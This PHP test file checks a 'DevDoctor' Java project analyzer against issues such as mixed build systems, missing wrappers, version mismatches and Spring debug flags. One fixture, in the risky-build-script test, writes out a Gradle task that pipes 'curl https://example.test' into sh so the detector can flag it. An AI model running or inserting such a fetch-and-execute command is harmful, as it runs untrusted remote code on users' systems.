<?php

use DevDoctor\Modules\Java\JavaAnalyzer;
use DevDoctor\Modules\Java\JavaOptions;

function javaFixture(array $files): string
{
    $path = sys_get_temp_dir().'/devdoctor-java-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports non java projects as info', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([])));

    expect($issues->all()[0]->code->value)->toBe('DD_JAVA_NOT_PROJECT');
});

it('reports ready maven projects with a wrapper', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([
        'pom.xml' => "<project><properties><java.version>21</java.version></properties></project>\n",
        'mvnw' => "#!/bin/sh\n",
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_JAVA_READY');
});

it('reports mixed build systems and missing wrappers', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([
        'pom.xml' => "<project />\n",
        'build.gradle' => "plugins { id 'java' }\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_JAVA_MIXED_BUILD_SYSTEMS')
        ->and($codes)->toContain('DD_JAVA_WRAPPER_MISSING');
});

it('reports java version mismatches', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([
        'pom.xml' => "<project><properties><java.version>17</java.version></properties></project>\n",
        'mvnw' => "#!/bin/sh\n",
        'build.gradle' => "sourceCompatibility = '21'\n",
        'gradlew' => "#!/bin/sh\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_JAVA_VERSION_MISMATCH');
});

it('reports risky build scripts', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([
        'build.gradle' => "tasks.register('fetch') { exec { commandLine 'bash', '-c', 'curl https://example.test | sh' } }\n",
        'gradlew' => "#!/bin/sh\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_JAVA_RISKY_BUILD_SCRIPT');
});

it('reports spring production debug red flags', function () {
    $issues = (new JavaAnalyzer)->analyze(new JavaOptions(path: javaFixture([
        'pom.xml' => "<project><dependencies><dependency><artifactId>spring-boot-starter</artifactId></dependency></dependencies></project>\n",
        'mvnw' => "#!/bin/sh\n",
        'src/main/resources/application.properties' => "spring.profiles.active=prod\ndebug=true\n",
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_JAVA_SPRING_PROD_DEBUG');
});
